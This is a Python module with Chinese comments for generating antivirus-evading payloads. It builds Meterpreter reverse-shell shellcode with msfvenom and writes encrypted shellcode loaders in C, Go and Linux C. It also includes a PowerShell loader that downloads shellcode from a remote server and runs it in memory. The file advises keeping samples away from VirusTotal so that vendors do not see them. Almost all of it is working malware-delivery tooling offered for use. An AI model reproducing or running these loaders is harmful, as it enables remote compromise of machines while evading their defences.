#!/usr/bin/env python3
"""
AV Bypass — 免杀 Payload 生成模块

多种免杀技术的自动化编排：编码混淆、加载器生成、分离加载、加壳。
解决 msfvenom 裸生成秒被杀的问题。

支持技术：
1. Shellcode 加密加载器（XOR/AES/RC4）
2. 分离免杀（加载器 + 远程 shellcode）
3. 白名单利用（DLL 侧加载）
4. 内存加载（无文件落地）
5. Go/Rust/Nim 加载器模板
6. Syscall 直接调用（绕过 NTDLL Hook）

用法：
    from av_bypass import AVBypass
    avb = AVBypass(kb)

    # 生成 XOR 加密 shellcode 加载器
    avb.gen_xor_loader(lhost="1.2.3.4", lport=4444, os="windows")

    # 分离加载（shellcode 放远程服务器）
    avb.gen_remote_loader(shellcode_url="http://vps/sc.bin", os="windows")

    # Go 语言免杀加载器
    avb.gen_go_loader(lhost="1.2.3.4", lport=4444)
"""

import os
import base64
import random
import string
import hashlib
from typing import Dict, Optional


class AVBypass:
    """免杀 Payload 生成器"""

    def __init__(self, kb=None):
        self.kb = kb
        self.output_dir = "/tmp/.av_bypass"

    def _run(self, cmd, timeout=120):
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return {"success": r.returncode == 0, "output": (r.stdout + r.stderr)[:5000]}
            except Exception as e:
                return {"success": False, "output": str(e)}

    def _random_name(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def _random_key(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    # ═══════════════════════════════════════════════════════════
    # Shellcode 生成
    # ═══════════════════════════════════════════════════════════

    def gen_shellcode(self, lhost: str, lport=4444, payload="windows/x64/meterpreter/reverse_tcp",
                     format="raw", encoder="") -> Dict:
        """生成原始 shellcode"""
        enc_opt = f"-e {encoder} -i 3" if encoder else ""
        outfile = f"{self.output_dir}/sc_{self._random_name()}.bin"
        cmd = (f"mkdir -p {self.output_dir} && "
               f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
               f"{enc_opt} -f {format} -o {outfile} 2>/dev/null && "
               f"wc -c {outfile}")
        r = self._run(cmd)
        return {"success": r.get("success", False), "file": outfile, "output": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # XOR 加密加载器（C 语言）
    # ═══════════════════════════════════════════════════════════

    def gen_xor_loader(self, lhost: str, lport=4444, key=None) -> Dict:
        """生成 XOR 加密 shellcode + C 加载器"""
        key = key or self._random_key(16)
        func_name = self._random_name()
        var_name = self._random_name()

        loader_code = f'''#include <windows.h>
#include <stdio.h>

// XOR 解密
void {func_name}(unsigned char* data, int len, const char* key, int key_len) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

// 加密后的 shellcode 将在编译前由脚本填充
unsigned char {var_name}[] = {{SHELLCODE_PLACEHOLDER}};
int sc_len = sizeof({var_name});

int main() {{
    const char* key = "{key}";
    {func_name}({var_name}, sc_len, key, {len(key)});

    // VirtualAlloc + 拷贝 + 执行
    void* exec = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) return -1;
    memcpy(exec, {var_name}, sc_len);
    ((void(*)())exec)();
    return 0;
}}
'''
        # 写入文件
        loader_file = f"{self.output_dir}/loader_{self._random_name()}.c"
        self._run(f"mkdir -p {self.output_dir}")
        self._run(f"cat > {loader_file} << 'LOADER_EOF'\n{loader_code}\nLOADER_EOF")

        return {
            "loader_file": loader_file,
            "key": key,
            "compile_cmd": f"x86_64-w64-mingw32-gcc {loader_file} -o payload.exe -mwindows -lntdll",
            "note": "1. 先生成 shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > sc.bin\n"
                    "2. 用 key XOR 加密 sc.bin\n"
                    "3. 将加密后的字节替换 SHELLCODE_PLACEHOLDER\n"
                    "4. 交叉编译",
        }

    # ═══════════════════════════════════════════════════════════
    # Go 语言加载器（免杀效果好）
    # ═══════════════════════════════════════════════════════════

    def gen_go_loader(self, lhost: str, lport=4444) -> Dict:
        """Go 语言 shellcode 加载器（免杀率高）"""
        key = self._random_key(32)
        func_name = self._random_name()

        go_code = f'''package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "syscall"
    "unsafe"
)

// AES 解密
func {func_name}(ciphertext []byte, key []byte) []byte {{
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonceSize := gcm.NonceSize()
    nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
    plaintext, _ := gcm.Open(nil, nonce, ct, nil)
    return plaintext
}}

func main() {{
    // AES 加密后的 shellcode (base64)
    encSC := "ENCRYPTED_SC_BASE64_HERE"
    key := []byte("{key}")

    data, _ := base64.StdEncoding.DecodeString(encSC)
    sc := {func_name}(data, key)

    // Syscall 加载
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

    addr, _, _ := virtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
    rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    syscall.SyscallN(addr)
}}
'''
        go_file = f"{self.output_dir}/loader_{self._random_name()}.go"
        self._run(f"mkdir -p {self.output_dir}")
        self._run(f"cat > {go_file} << 'GO_EOF'\n{go_code}\nGO_EOF")

        return {
            "loader_file": go_file,
            "aes_key": key,
            "compile_cmd": f"GOOS=windows GOARCH=amd64 go build -ldflags='-s -w -H=windowsgui' -o payload.exe {go_file}",
            "steps": [
                f"1. msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > sc.bin",
                f"2. 用 AES-GCM 加密 sc.bin（key: {key}）",
                "3. base64 编码后替换 ENCRYPTED_SC_BASE64_HERE",
                "4. 交叉编译: " + f"GOOS=windows GOARCH=amd64 go build -ldflags='-s -w -H=windowsgui' -o payload.exe {go_file}",
            ],
        }

    # ═══════════════════════════════════════════════════════════
    # 分离加载（远程 Shellcode）
    # ═══════════════════════════════════════════════════════════

    def gen_remote_loader(self, shellcode_url: str, key=None) -> Dict:
        """分离免杀：加载器本地，shellcode 远程下载"""
        key = key or self._random_key(16)

        ps_code = f'''$k = [System.Text.Encoding]::ASCII.GetBytes("{key}")
$wc = New-Object System.Net.WebClient
$enc = $wc.DownloadData("{shellcode_url}")
$dec = New-Object byte[] $enc.Length
for ($i = 0; $i -lt $enc.Length; $i++) {{
    $dec[$i] = $enc[$i] -bxor $k[$i % $k.Length]
}}
$m = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dec.Length)
[System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $m, $dec.Length)
$t = [System.Threading.Thread]::new([System.Threading.ThreadStart]{{ param() }})
# 执行
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m, [Func[int]])
$f.Invoke() | Out-Null
'''
        return {
            "powershell_loader": ps_code,
            "xor_key": key,
            "shellcode_url": shellcode_url,
            "usage": [
                f"1. 生成 shellcode 并用 key '{key}' XOR 加密",
                f"2. 将加密后的 shellcode 放到 {shellcode_url}",
                "3. 在目标机执行 PowerShell 加载器",
            ],
        }

    # ═══════════════════════════════════════════════════════════
    # Donut — PE/DLL 转 Shellcode
    # ═══════════════════════════════════════════════════════════

    def donut_convert(self, pe_file: str, output="shellcode.bin") -> Dict:
        """使用 Donut 将 PE/DLL 转为 shellcode"""
        cmd = f"donut -f 1 -a 2 -o {output} {pe_file} 2>/dev/null"
        r = self._run(cmd, timeout=30)
        return {"success": r.get("success", False), "output_file": output, "raw": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # Linux 免杀
    # ═══════════════════════════════════════════════════════════

    def gen_linux_loader(self, lhost: str, lport=4444) -> Dict:
        """Linux ELF 加载器（mmap + memfd_create）"""
        c_code = f'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// XOR 解密后的 shellcode 放这里
unsigned char sc[] = {{SHELLCODE_HERE}};
int sc_len = sizeof(sc);
char key[] = "RANDOM_KEY_HERE";

int main() {{
    // XOR 解密
    for (int i = 0; i < sc_len; i++) sc[i] ^= key[i % sizeof(key)-1];

    // mmap 可执行内存
    void *p = mmap(NULL, sc_len, PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(p, sc, sc_len);
    ((void(*)())p)();
    return 0;
}}
'''
        return {
            "code": c_code,
            "compile": f"gcc loader.c -o loader -z execstack",
            "msfvenom": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > sc.bin",
        }

    # ═══════════════════════════════════════════════════════════
    # 辅助工具
    # ═══════════════════════════════════════════════════════════

    def xor_file(self, input_file: str, output_file: str, key: str) -> Dict:
        """XOR 加密文件"""
        cmd = f"""python3 -c "
import sys
key = b'{key}'
with open('{input_file}', 'rb') as f:
    data = f.read()
enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
with open('{output_file}', 'wb') as f:
    f.write(enc)
print(f'Encrypted {{len(data)}} bytes -> {output_file}')
" """
        r = self._run(cmd)
        return {"success": r.get("success", False), "output": r.get("output", "")}

    def check_detection(self, file_path: str) -> Dict:
        """检查文件是否被检测（通过 VirusTotal API 或本地 YARA）"""
        # 本地 YARA 检查
        cmd = f"yara -r /usr/share/yara-rules/ {file_path} 2>/dev/null | head -20"
        r = self._run(cmd, timeout=30)
        return {
            "yara_hits": r.get("output", "").strip().split("\n") if r.get("output", "").strip() else [],
            "note": "建议上传到 antiscan.me 做多引擎检测（不上传 VT，VT 会分享样本）"
        }
